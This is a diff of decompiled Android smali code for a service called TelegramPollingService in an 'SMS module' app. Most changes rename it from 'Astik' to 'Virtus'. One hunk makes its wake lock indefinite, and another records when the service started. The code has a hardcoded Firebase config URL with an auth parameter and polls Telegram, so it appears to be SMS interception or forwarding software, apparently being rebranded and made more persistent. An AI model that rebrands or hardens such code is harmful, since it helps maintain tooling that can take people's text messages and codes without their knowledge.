@@ -12,11 +12,13 @@
 
 .field private static final PREFS_NAME:Ljava/lang/String; = "astik_module_prefs"
 
-.field private static final TAG:Ljava/lang/String; = "AstikModule"
+.field private static final TAG:Ljava/lang/String; = "VirtusModule"
 
 .field public static volatile cfgMonitoring:Z
 
 .field public static volatile cfgTs:J
+
+.field public static serviceStartedAt:J
 
 
 # instance fields
@@ -279,7 +281,7 @@
 
     move-result-object v0
 
-    const-string v1, "AstikModule"
+    const-string v1, "VirtusModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -342,7 +344,7 @@
 
     .line 222
     :goto_1
-    const-string v2, "ASTIK SMS MODULE"
+    const-string v2, "VIRTUS SMS MODULE"
 
     invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
 
@@ -458,7 +460,7 @@
     .line 208
     new-instance v0, Landroid/app/NotificationChannel;
 
-    const-string v1, "Astik Module"
+    const-string v1, "Virtus Module"
 
     const/4 v2, 0x2
 
@@ -609,7 +611,7 @@
 
     move-result-object p1
 
-    const-string v0, "AstikModule"
+    const-string v0, "VirtusModule"
 
     invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -642,7 +644,7 @@
     .locals 7
 
     .line 522
-    const-string v0, "AstikModule"
+    const-string v0, "VirtusModule"
 
     .line 0
     const-string v1, "?auth="
@@ -1184,7 +1186,7 @@
 
     .line 375
     :cond_2
-    const-string v6, "AstikModule"
+    const-string v6, "VirtusModule"
 
     new-instance v7, Ljava/lang/StringBuilder;
 
@@ -1223,7 +1225,7 @@
     if-eqz v2, :cond_3
 
     .line 380
-    const-string v1, "AstikModule"
+    const-string v1, "VirtusModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1241,7 +1243,7 @@
 
     .line 382
     :cond_3
-    const-string v0, "AstikModule"
+    const-string v0, "VirtusModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1284,7 +1286,7 @@
 
     .line 385
     :try_start_2
-    const-string v1, "AstikModule"
+    const-string v1, "VirtusModule"
 
     new-instance v2, Ljava/lang/StringBuilder;
 
@@ -1342,7 +1344,7 @@
     .locals 8
 
     .line 463
-    const-string v0, "AstikModule"
+    const-string v0, "VirtusModule"
 
     .line 0
     const-string v1, "https://base-e3797-default-rtdb.firebaseio.com/config/"
@@ -1811,7 +1813,7 @@
 
     move-result v6
 
-    const-string v7, "AstikModule"
+    const-string v7, "VirtusModule"
 
     if-eqz v6, :cond_0
 
@@ -2424,7 +2426,7 @@
 
     move-result-object v0
 
-    const-string v1, "AstikModule"
+    const-string v1, "VirtusModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -2562,7 +2564,7 @@
     invoke-direct {p0}, Lcom/astik/module/TelegramPollingService;->createNotificationChannel()V
 
     .line 81
-    const-string v0, "ASTIK SMS MODULE \u2014 running"
+    const-string v0, "VIRTUS SMS MODULE \u2014 running"
 
     invoke-direct {p0, v0}, Lcom/astik/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
 
@@ -2601,9 +2603,7 @@
     .line 87
     iget-object v0, p0, Lcom/astik/module/TelegramPollingService;->wakeLock:Landroid/os/PowerManager$WakeLock;
 
-    const-wide/32 v1, 0x1b7740
-
-    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
+    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -2629,7 +2629,7 @@
 
     move-result-object v0
 
-    const-string v1, "AstikModule"
+    const-string v1, "VirtusModule"
 
     invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
@@ -2730,13 +2730,48 @@
 .end method
 
 .method public onStartCommand(Landroid/content/Intent;II)I
-    .locals 1
+    .locals 6
 
     const/4 p1, 0x1
 
     .line 97
     iput-boolean p1, p0, Lcom/astik/module/TelegramPollingService;->isRunning:Z
 
+    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
+
+    move-result-wide v0
+
+    sget-wide v2, Lcom/astik/module/TelegramPollingService;->serviceStartedAt:J
+
+    const-wide/16 v4, 0x0
+
+    cmp-long v2, v2, v4
+
+    if-gtz v2, :skip_service_start_ts
+
+    sput-wide v0, Lcom/astik/module/TelegramPollingService;->serviceStartedAt:J
+
+    const-string v2, "astik_module_prefs"
+
+    const/4 v4, 0x0
+
+    invoke-virtual {p0, v2, v4}, Lcom/astik/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v2
+
+    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v2
+
+    const-string v4, "service_started_at"
+
+    invoke-interface {v2, v4, v0, v1}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v0
+
+    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
+
+    :skip_service_start_ts
     const/4 p2, 0x0
 
     .line 98
@@ -2850,7 +2885,7 @@
 
     move-result-object p1
 
-    const-string v0, "AstikModule"
+    const-string v0, "VirtusModule"
 
     invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
 
